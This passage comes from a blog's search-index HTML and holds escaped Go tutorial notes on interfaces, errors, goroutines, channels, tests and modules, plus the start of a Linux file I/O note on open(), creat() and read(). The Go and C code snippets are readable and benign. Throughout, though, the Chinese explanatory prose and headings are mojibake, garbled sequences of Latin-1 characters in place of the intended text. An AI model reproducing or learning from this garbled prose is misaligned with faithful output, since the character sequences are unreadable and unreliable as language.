s1 := s[:2:4]
s2 := append(s1, 1,2,3,4,5)

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// copy
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å‡½æ•°&#34;&gt;å‡½æ•°&lt;/h3&gt;
&lt;p&gt;goå‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«å‘½åï¼Œä¼šè¢«è§†ä½œå®šä¹‰åœ¨å‡½æ•°é¡¶éƒ¨çš„å˜é‡ã€‚&lt;/p&gt;
&lt;p&gt;æ²¡æœ‰å‚æ•°çš„returnä¼šè¿”å›å·²ç»å‘½åçš„è¿”å›å€¼ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ¥å£&#34;&gt;æ¥å£&lt;/h3&gt;
&lt;p&gt;Go è¯­è¨€æä¾›äº†å¦å¤–ä¸€ç§æ•°æ®ç±»å‹å³æ¥å£ï¼Œå®ƒæŠŠæ‰€æœ‰çš„å…·æœ‰å…±æ€§çš„æ–¹æ³•å®šä¹‰åœ¨ä¸€èµ·ï¼Œä»»ä½•å…¶ä»–ç±»å‹åªè¦å®ç°äº†è¿™äº›æ–¹æ³•å°±æ˜¯å®ç°äº†è¿™ä¸ªæ¥å£ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/* å®šä¹‰æ¥å£ */
type interface_name interface {
   method_name1 [return_type]
   method_name2 [return_type]
   method_name3 [return_type]
   ...
   method_namen [return_type]
}

/* å®šä¹‰ç»“æ„ä½“ */
type struct_name struct {
   /* variables */
}

/* å®ç°æ¥å£æ–¹æ³• */
func (struct_name_variable struct_name) method_name1() [return_type] {
   /* æ–¹æ³•å®ç° */
}
...
func (struct_name_variable struct_name) method_namen() [return_type] {
   /* æ–¹æ³•å®ç°*/
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;é”™è¯¯å¤„ç†&#34;&gt;é”™è¯¯å¤„ç†&lt;/h3&gt;
&lt;p&gt;Go è¯­è¨€é€šè¿‡å†…ç½®çš„é”™è¯¯æ¥å£æä¾›äº†éå¸¸ç®€å•çš„é”™è¯¯å¤„ç†æœºåˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;errorç±»å‹æ˜¯ä¸€ä¸ªæ¥å£ç±»å‹ï¼Œè¿™æ˜¯å®ƒçš„å®šä¹‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type error interface {
    Error() string
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥åœ¨ç¼–ç ä¸­é€šè¿‡å®ç° error æ¥å£ç±»å‹æ¥ç”Ÿæˆé”™è¯¯ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;å‡½æ•°é€šå¸¸åœ¨æœ€åçš„è¿”å›å€¼ä¸­è¿”å›é”™è¯¯ä¿¡æ¯ã€‚ä½¿ç”¨errors.New å¯è¿”å›ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func Sqrt(f float64) (float64, error) {
    if f &amp;lt; 0 {
        return 0, errors.New(&amp;quot;math: square root of negative number&amp;quot;)
    }
    // å®ç°
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨Sqrtçš„æ—¶å€™ä¼ é€’çš„ä¸€ä¸ªè´Ÿæ•°ï¼Œç„¶åå°±å¾—åˆ°äº†non-nilçš„errorå¯¹è±¡ï¼Œå°†æ­¤å¯¹è±¡ä¸nilæ¯”è¾ƒï¼Œç»“æœä¸ºtrueï¼Œæ‰€ä»¥fmt.Println(fmtåŒ…åœ¨å¤„ç†erroræ—¶ä¼šè°ƒç”¨Erroræ–¹æ³•)è¢«è°ƒç”¨ï¼Œä»¥è¾“å‡ºé”™è¯¯ï¼Œè¯·çœ‹ä¸‹é¢è°ƒç”¨çš„ç¤ºä¾‹ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;result, err:= Sqrt(-1)

if err != nil {
   fmt.Println(err)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å¹¶å‘&#34;&gt;å¹¶å‘&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬åªéœ€è¦é€šè¿‡ go å…³é”®å­—æ¥å¼€å¯ goroutine å³å¯ï¼ŒåŒæ—¶goè¯­è¨€æä¾›äº†syncå’Œchannelä¸¤ç§æ–¹å¼æ”¯æŒåç¨‹çš„å¹¶å‘ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;sync&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚æˆ‘ä»¬å¸Œæœ›å¹¶å‘ä¸‹è½½ N ä¸ªèµ„æºï¼Œå¤šä¸ªå¹¶å‘åç¨‹ä¹‹é—´ä¸éœ€è¦é€šä¿¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨ sync.WaitGroupï¼Œç­‰å¾…æ‰€æœ‰å¹¶å‘åç¨‹æ‰§è¡Œç»“æŸã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import (
	&amp;quot;fmt&amp;quot;
	&amp;quot;sync&amp;quot;
	&amp;quot;time&amp;quot;
)

var wg sync.WaitGroup

func download(url string) {
	fmt.Println(&amp;quot;start to download&amp;quot;, url)
	time.Sleep(time.Second) // æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ
	wg.Done() // å‡å»ä¸€ä¸ªè®¡æ•°
}

func main() {
	for i := 0; i &amp;lt; 3; i++ {
		wg.Add(1) // ä¸ºwgæ·»åŠ ä¸€ä¸ªè®¡æ•°
		go download(&amp;quot;a.com/&amp;quot; + string(i+&#39;0&#39;))
	}
	wg.Wait() // ç­‰å¾…æ‰€æœ‰æºç¨‹æ‰§è¡Œç»“æŸ
	fmt.Println(&amp;quot;Done!&amp;quot;)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;channel&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ channel ä¿¡é“ï¼Œå¯ä»¥åœ¨åç¨‹ä¹‹é—´ä¼ é€’æ¶ˆæ¯ã€‚é˜»å¡ç­‰å¾…å¹¶å‘åç¨‹è¿”å›æ¶ˆæ¯ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;var ch = make(chan string, 10) // åˆ›å»ºå¤§å°ä¸º 10 çš„ç¼“å†²ä¿¡é“

func download(url string) {
	fmt.Println(&amp;quot;start to download&amp;quot;, url)
	time.Sleep(time.Second)
	ch &amp;lt;- url // å°† url å‘é€ç»™ä¿¡é“
}

func main() {
	for i := 0; i &amp;lt; 3; i++ {
		go download(&amp;quot;a.com/&amp;quot; + string(i+&#39;0&#39;))
	}
	for i := 0; i &amp;lt; 3; i++ {
		msg := &amp;lt;-ch // ç­‰å¾…ä¿¡é“è¿”å›æ¶ˆæ¯ã€‚
		fmt.Println(&amp;quot;finish&amp;quot;, msg)
	}
	fmt.Println(&amp;quot;Done!&amp;quot;)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;channelæ˜¯ç”¨æ¥ä¼ é€’æ•°æ®çš„ä¸€ä¸ªæ•°æ®ç»“æ„ã€‚é€šé“å¯ç”¨äºä¸¤ä¸ª goroutine ä¹‹é—´é€šè¿‡ä¼ é€’ä¸€ä¸ªæŒ‡å®šç±»å‹çš„å€¼æ¥åŒæ­¥è¿è¡Œå’Œé€šè®¯ã€‚æ“ä½œç¬¦ &lt;code&gt;&amp;lt;-&lt;/code&gt; ç”¨äºæŒ‡å®šé€šé“çš„æ–¹å‘ï¼Œå‘é€æˆ–æ¥æ”¶ã€‚å¦‚æœæœªæŒ‡å®šæ–¹å‘ï¼Œåˆ™ä¸ºåŒå‘é€šé“ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;å•å…ƒæµ‹è¯•&#34;&gt;å•å…ƒæµ‹è¯•&lt;/h3&gt;
&lt;p&gt;å‡è®¾æˆ‘ä»¬å¸Œæœ›æµ‹è¯• package main ä¸‹ &lt;code&gt;calc.go&lt;/code&gt; ä¸­çš„å‡½æ•°ï¼Œè¦åªéœ€è¦æ–°å»º &lt;code&gt;calc_test.go&lt;/code&gt; æ–‡ä»¶ï¼Œåœ¨&lt;code&gt;calc_test.go&lt;/code&gt;ä¸­æ–°å»ºæµ‹è¯•ç”¨ä¾‹å³å¯ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// calc.go
package main

func add(num1 int, num2 int) int {
	return num1 + num2
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// calc_test.go
package main

import &amp;quot;testing&amp;quot;

func TestAdd(t *testing.T) {
	if ans := add(1, 2); ans != 3 {
		t.Error(&amp;quot;add(1, 2) should be equal to 3&amp;quot;)
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œ &lt;code&gt;go test&lt;/code&gt;ï¼Œå°†è‡ªåŠ¨è¿è¡Œå½“å‰ package ä¸‹çš„æ‰€æœ‰æµ‹è¯•ç”¨ä¾‹ï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹è¯¦ç»†çš„ä¿¡æ¯ï¼Œå¯ä»¥æ·»åŠ &lt;code&gt;-v&lt;/code&gt;å‚æ•°ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go test -v
=== RUN   TestAdd
--- PASS: TestAdd (0.00s)
PASS
ok      example 0.040s
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;åŒ…å’Œæ¨¡å—&#34;&gt;åŒ…å’Œæ¨¡å—&lt;/h3&gt;
&lt;h4 id=&#34;package&#34;&gt;Package&lt;/h4&gt;
&lt;p&gt;ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªæ–‡ä»¶å¤¹å¯ä»¥ä½œä¸º packageï¼ŒåŒä¸€ä¸ª package å†…éƒ¨å˜é‡ã€ç±»å‹ã€æ–¹æ³•ç­‰å®šä¹‰å¯ä»¥ç›¸äº’çœ‹åˆ°ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚æˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶ &lt;code&gt;calc.go&lt;/code&gt;ï¼Œ &lt;code&gt;main.go&lt;/code&gt; å¹³çº§ï¼Œåˆ†åˆ«å®šä¹‰ add å’Œ main æ–¹æ³•ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// calc.go
package main

func add(num1 int, num2 int) int {
	return num1 + num2
}
// main.go
package main

import &amp;quot;fmt&amp;quot;

func main() {
	fmt.Println(add(3, 5)) // 8
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œ &lt;code&gt;go run main.go&lt;/code&gt;ï¼Œä¼šæŠ¥é”™ï¼Œadd æœªå®šä¹‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./main.go:6:14: undefined: add
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å› ä¸º &lt;code&gt;go run main.go&lt;/code&gt; ä»…ç¼–è¯‘ main.go ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥å‘½ä»¤éœ€è¦æ¢æˆ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go run main.go calc.go
8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go run .
8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Go è¯­è¨€ä¹Ÿæœ‰ Public å’Œ Private çš„æ¦‚å¿µï¼Œç²’åº¦æ˜¯åŒ…ã€‚å¦‚æœç±»å‹/æ¥å£/æ–¹æ³•/å‡½æ•°/å­—æ®µçš„é¦–å­—æ¯å¤§å†™ï¼Œåˆ™æ˜¯ Public çš„ï¼Œå¯¹å…¶ä»– package å¯è§ï¼Œå¦‚æœé¦–å­—æ¯å°å†™ï¼Œåˆ™æ˜¯ Private çš„ï¼Œå¯¹å…¶ä»– package ä¸å¯è§ã€‚&lt;/p&gt;
&lt;h4 id=&#34;modules&#34;&gt;Modules&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/golang/go/wiki/Modules&#34;&gt;Go Modules&lt;/a&gt; æ˜¯ Go 1.11 ç‰ˆæœ¬ä¹‹åå¼•å…¥çš„ï¼ŒGo 1.11 ä¹‹å‰ä½¿ç”¨ $GOPATH æœºåˆ¶ã€‚Go Modules å¯ä»¥ç®—ä½œæ˜¯è¾ƒä¸ºå®Œå–„çš„åŒ…ç®¡ç†å·¥å…·ã€‚åŒæ—¶æ”¯æŒä»£ç†ï¼Œå›½å†…ä¹Ÿèƒ½äº«å—é«˜é€Ÿçš„ç¬¬ä¸‰æ–¹åŒ…é•œåƒæœåŠ¡ã€‚æ¥ä¸‹æ¥ç®€å•ä»‹ç» &lt;code&gt;go mod&lt;/code&gt; çš„ä½¿ç”¨ã€‚Go Modules åœ¨ 1.13 ç‰ˆæœ¬ä»æ˜¯å¯é€‰ä½¿ç”¨çš„ï¼Œç¯å¢ƒå˜é‡ GO111MODULE çš„å€¼é»˜è®¤ä¸º AUTOï¼Œå¼ºåˆ¶ä½¿ç”¨ Go Modules è¿›è¡Œä¾èµ–ç®¡ç†ï¼Œå¯ä»¥å°† GO111MODULE è®¾ç½®ä¸º ONã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ä¸€ä¸ªç©ºæ–‡ä»¶å¤¹ä¸‹ï¼Œåˆå§‹åŒ–ä¸€ä¸ª Module&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go mod init example
go: creating new go.mod: module example
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤æ—¶ï¼Œåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆäº†&lt;code&gt;go.mod&lt;/code&gt;ï¼Œè¿™ä¸ªæ–‡ä»¶è®°å½•å½“å‰æ¨¡å—çš„æ¨¡å—åä»¥åŠæ‰€æœ‰ä¾èµ–åŒ…çš„ç‰ˆæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ç€ï¼Œæˆ‘ä»¬åœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºæ–‡ä»¶ &lt;code&gt;main.go&lt;/code&gt;ï¼Œæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;fmt&amp;quot;

	&amp;quot;rsc.io/quote&amp;quot;
)

func main() {
	fmt.Println(quote.Hello())  // Ahoy, world!
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œ &lt;code&gt;go run .&lt;/code&gt;ï¼Œå°†ä¼šè‡ªåŠ¨è§¦å‘ç¬¬ä¸‰æ–¹åŒ… &lt;code&gt;rsc.io/quote&lt;/code&gt;çš„ä¸‹è½½ï¼Œå…·ä½“çš„ç‰ˆæœ¬ä¿¡æ¯ä¹Ÿè®°å½•åœ¨äº†&lt;code&gt;go.mod&lt;/code&gt;ä¸­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;module example

go 1.13

require rsc.io/quote v3.1.0+incompatible
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨å½“å‰ç›®å½•ï¼Œæ·»åŠ ä¸€ä¸ªå­ package calcï¼Œä»£ç ç›®å½•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;demo/
   |--calc/
      |--calc.go
   |--main.go
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨ &lt;code&gt;calc.go&lt;/code&gt; ä¸­å†™å…¥&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package calc

func Add(num1 int, num2 int) int {
	return num1 + num2
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨ package main ä¸­å¦‚ä½•ä½¿ç”¨ package cal ä¸­çš„ Add å‡½æ•°å‘¢ï¼Ÿ&lt;code&gt;import æ¨¡å—å/å­ç›®å½•å&lt;/code&gt; å³å¯ï¼Œä¿®æ”¹åçš„ main å‡½æ•°å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;fmt&amp;quot;
	&amp;quot;example/calc&amp;quot;

	&amp;quot;rsc.io/quote&amp;quot;
)

func main() {
	fmt.Println(quote.Hello())
	fmt.Println(calc.Add(10, 3))
}

$ go run .
Ahoy, world!
13
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ä¸€äº›æ€è€ƒé—®é¢˜&#34;&gt;ä¸€äº›æ€è€ƒé—®é¢˜&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ç”¨å†…ç½®deleteå‡½æ•°å¯¹mapå…ƒç´ è¿›è¡Œåˆ é™¤åï¼Œå†…å­˜ä¼šçœŸçš„é‡Šæ”¾å—ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ä¸ä¼šã€‚å”¯ä¸€çš„æ–¹æ³•æ˜¯é‡æ–°åˆ›å»ºä¸€ä¸ªmapå¯¹æ—§mapè¿›è¡Œå¤åˆ¶ã€‚https://github.com/golang/go/issues/20135&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
">ã€goã€‘golang</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-xi-tong-bian-cheng-wen-jian-io/"" data-c="
          &lt;h2 id=&#34;æ–‡ä»¶çš„åŸºæœ¬åŸç†&#34;&gt;æ–‡ä»¶çš„åŸºæœ¬åŸç†&lt;/h2&gt;
&lt;p&gt;å½“è¿›ç¨‹æ¯æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…æ ¸ä¼šä¸ºå…¶è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦fdï¼Œæ˜¯ä¸€ä¸ªéè´Ÿintæ•´æ•°ï¼Œä¹‹åå¯¹æ–‡ä»¶çš„æ“ä½œéœ€è¦ä»¥fdä½œä¸ºä¸»è¦å‚æ•°ã€‚ä¸€èˆ¬ä»0ç®—èµ·ï¼Œä¸Šé™ä¸º1024-1ï¼Œä½†å¯ä»¥è®¾å®šä¸Šé™å€¼ã€‚&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªè¿›ç¨‹é»˜è®¤ä¼šæ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶ï¼Œå…¶æ–‡ä»¶æè¿°ç¬¦åˆ†åˆ«ä¸º&lt;code&gt;STDIN_FILENO STDOUT_FILENO STDERR_FILENO&lt;/code&gt;ï¼Œå³0 1 2ï¼Œåˆ†åˆ«è¡¨ç¤ºæ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯ã€‚&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶æè¿°ç¬¦ä¸ä»…èƒ½è¡¨ç¤ºæ™®é€šæ–‡ä»¶ï¼Œè¿˜èƒ½è¡¨ç¤ºè®¾å¤‡æ–‡ä»¶ã€ç›®å½•ã€socketç­‰ç­‰ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ‰“å¼€æ–‡ä»¶&#34;&gt;æ‰“å¼€æ–‡ä»¶&lt;/h2&gt;
&lt;h3 id=&#34;openç³»ç»Ÿè°ƒç”¨&#34;&gt;open()ç³»ç»Ÿè°ƒç”¨&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int open(const char *name, int flags, mode_t mode);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°†è·¯å¾„nameæ‰€æŒ‡å®šçš„æ–‡ä»¶æ˜ å°„è‡³ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å¹¶è¿”å›ï¼Œflagså¯å–&lt;code&gt;O_RDONLY O_WRONLY O_RDWR&lt;/code&gt;ï¼Œåªè¯»ã€åªå†™ã€è¯»å†™ã€‚æ–‡ä»¶ä½ç½®ä¼šè®¾ç½®åˆ°å¼€å¤´ã€‚&lt;/p&gt;
&lt;p&gt;flagsä¸Šè¿°ä¸‰ç§æ‰“å¼€æ–‡ä»¶çš„æ–¹å¼è¿˜å¯ä»¥ä¸ä»¥ä¸‹å¸¸ç”¨å‚æ•°è¿›è¡Œ&lt;strong&gt;æŒ‰ä½é€»è¾‘æˆ–&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;flags&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_APPEND&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;é™„åŠ æ¨¡å¼æ‰“å¼€&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_CREAT&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºï¼Œå¦‚æœå­˜åœ¨åˆ™éœ€è¦åŒæ—¶æŒ‡å®šO_EXCLå°†ä¼šè°ƒç”¨å¤±è´¥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_EXCL&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å¦‚æœæŒ‡å®šO_CREATä¸”æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™æ­¤æ ‡å¿—ä¼šå¯¼è‡´è°ƒç”¨å¤±è´¥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_DIRECT&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ‰“å¼€æ–‡ä»¶ä»¥ä¾¿è¿›è¡Œç›´æ¥I/O&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_NOFOLLOW&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å¦‚æœnameæ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œåˆ™ä¼šè°ƒç”¨å¤±è´¥ï¼Œä½†å¦‚æœç›®å½•æ˜¯ç¬¦å·é“¾æ¥ï¼Œæ–‡ä»¶ä¸æ˜¯ï¼Œä¹Ÿä¼šæ‰“å¼€æˆåŠŸ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_NONBLOCK&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ä»¥éé˜»æŒ¡æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œå³è¿›ç¨‹åœ¨openæ—¶æˆ–è€…å…¶å®ƒæ“ä½œæ—¶éƒ½ä¸ä¼šé˜»æŒ¡æ­£åœ¨è¿›è¡Œçš„I/Oï¼Œæ­¤è¡Œä¸ºåªèƒ½ç”¨äºå®šä¹‰FIFO&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;åªè¦ä¸æ˜¯åœ¨åˆ›å»ºæ–‡ä»¶ï¼Œåˆ™modeå¯ä»¥å¿½ç•¥ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨åˆ›å»ºæ–‡ä»¶æ—¶éœ€è¦è®¾å®šæ–‡ä»¶ä½¿ç”¨æƒé™ï¼Œä¹Ÿæ˜¯æŒ‰ä½é€»è¾‘æˆ–ã€‚&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;mode&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRWXU&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ‹¥æœ‰è€…å…·æœ‰è¯»å–ã€å†™å…¥å’Œæ‰§è¡Œçš„æƒé™&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRUSR&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ‹¥æœ‰è€…å…·æœ‰è¯»å–çš„æƒé™&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IWUSR&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ‹¥æœ‰è€…å…·æœ‰å†™å…¥çš„æƒé™&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IXUSR&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ‹¥æœ‰è€…å…·æœ‰æ‰§è¡Œæƒé™&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRWXG&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ç»„å…·æœ‰è¯»å–ã€å†™å…¥å’Œæ‰§è¡Œæƒé™&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRGRP&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ç»„ è¯»å–&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IWGRP&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ç»„ å†™å…¥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IXGRP&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ç»„ æ‰§è¡Œ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRWXO&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å…¶ä»–äºº è¯»å†™æ‰§è¡Œ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IROTH&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å…¶ä»–äºº è¯»&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IWOTH&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å…¶ä»–äºº å†™&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IXOTH&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å…¶ä»–äºº æ‰§è¡Œ&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int fd = open(&amp;quot;/home/test&amp;quot;, O_WRONLY | O_APPEND)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;creatç³»ç»Ÿè°ƒç”¨&#34;&gt;creat()ç³»ç»Ÿè°ƒç”¨&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int creat(const char *name, mode_t mode);
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;readç³»ç»Ÿè°ƒç”¨&#34;&gt;read()ç³»ç»Ÿè°ƒç”¨&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;ssize_t read(int fd, void *buf, size_t len);
&lt;/code&gt;&lt;/pre&gt;
